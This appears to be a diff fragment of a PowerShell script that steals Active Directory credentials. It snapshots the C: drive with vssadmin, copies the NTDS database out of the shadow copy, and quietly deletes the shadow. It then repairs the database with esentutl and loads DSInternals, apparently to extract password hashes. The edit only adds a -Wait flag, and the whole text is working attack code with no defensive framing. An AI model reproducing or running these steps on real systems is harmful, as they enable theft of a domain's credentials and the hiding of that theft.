@@ -19,7 +19,7 @@ $vss=Get-CimInstance -ClassName Win32_ShadowCopy -Property * | Select-Object Dev
 vssadmin create shadow /for=C:
 $vss=Get-CimInstance -ClassName Win32_ShadowCopy -Property * | Select-Object DeviceObject,ID
 $vss[0]
-Start-Process -FilePath cmd.exe -ArgumentList "/c copy ${$vss[0].DeviceObject}\Windows\NTDS `"C:\new folder`""
+Start-Process -FilePath cmd.exe -ArgumentList "/c copy ${$vss[0].DeviceObject}\Windows\NTDS `"C:\new folder`"" -Wait
 vssadmin.exe delete shadows /shadow="$($vss[0].ID)" /quiet
 esentutl /r edb /d
 import-module -name .\dsinternals
